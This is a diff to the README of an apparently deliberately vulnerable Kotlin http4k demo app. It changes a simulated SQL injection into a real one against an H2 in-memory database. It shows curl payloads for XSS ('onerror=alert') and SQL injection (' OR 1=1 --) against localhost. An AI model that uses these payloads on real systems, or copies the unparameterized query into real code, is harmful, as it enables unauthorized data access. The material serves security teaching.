@@ -62,22 +62,22 @@ curl "http://localhost:9000/greet?name=<img src=x onerror=alert('XSS')>"
 
 ---
 
-### 2. SQL Injection (Simulated)
+### 2. SQL Injection
 
 **Location:** `/search` endpoint
 
-**Description:** Search query is concatenated into SQL-like string without parameterization.
+**Description:** Search query is concatenated into a SQL query without parameterization, executed directly against an H2 in-memory database.
 
 **Exploit with CURL:**
 ```bash
 # Basic SQL injection to retrieve all products
-curl "http://localhost:9000/search?q=laptop%27%20OR%20%271%27=%271"
+curl "http://localhost:9000/search?q=%27%20OR%20%271%27=%271"
 
 # Alternative payload
 curl "http://localhost:9000/search?q=%27%20OR%201=1%20--"
 ```
 
-**Expected Result:** Returns all products instead of just matching ones, demonstrating SQL injection success.
+**Expected Result:** Returns all products instead of just matching ones, demonstrating successful SQL injection attack against a real database.
 
 ---
 
@@ -171,6 +171,7 @@ kotlin-http4k-fn/
 - **http4k-core**: Lightweight HTTP toolkit for Kotlin
 - **http4k-server-netty**: Netty server backend
 - **jsoup**: HTML parser for widget extraction
+- **h2**: Lightweight in-memory SQL database
 
 ## Security Notes
 
